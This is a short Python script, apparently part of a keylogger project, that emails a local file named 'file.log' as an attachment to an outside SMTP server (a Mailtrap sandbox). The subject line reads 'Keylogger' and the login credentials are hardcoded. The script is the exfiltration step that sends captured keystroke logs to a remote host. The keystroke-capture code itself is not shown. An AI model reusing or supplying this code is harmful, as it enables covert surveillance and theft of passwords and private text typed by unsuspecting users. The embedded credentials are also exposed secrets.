import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

email_user = '4a2a9491d68ef5'
email_password = 'f72e052a479331'
email_send = 'sandbox.smtp.mailtrap.io'
subject = 'Keylogger'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject
#put any body you like
# f = open('a.txt', 'r')
# str= f.read()
body = 'abc'
msg.attach(MIMEText(body,'plain'))

filename='file.log'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('sandbox.smtp.mailtrap.io',2525)
server.starttls()
server.login(email_user,email_password)

server.sendmail(email_user,email_send,text)
server.quit()